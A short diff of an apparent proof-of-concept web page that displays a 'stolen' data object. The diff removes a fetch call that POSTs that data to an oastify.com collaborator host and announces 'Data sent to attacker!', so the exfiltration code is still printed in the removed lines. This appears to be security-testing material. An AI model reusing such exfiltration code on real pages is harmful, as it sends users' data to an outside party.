@@ -16,13 +16,6 @@ const stolen = {
 output.innerHTML = '<h2>Stolen Data:</h2><pre>' + 
     JSON.stringify(stolen, null, 2) + '</pre>';
 
-fetch('https://8jsfvy44qbgemit855hygopndej57wzko.oastify.com', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(stolen)
-}).then(() => {
-    output.innerHTML += '<p style="color:green">✓ Data sent to attacker!</p>';
-});
 </script>
 </body>
 </html>
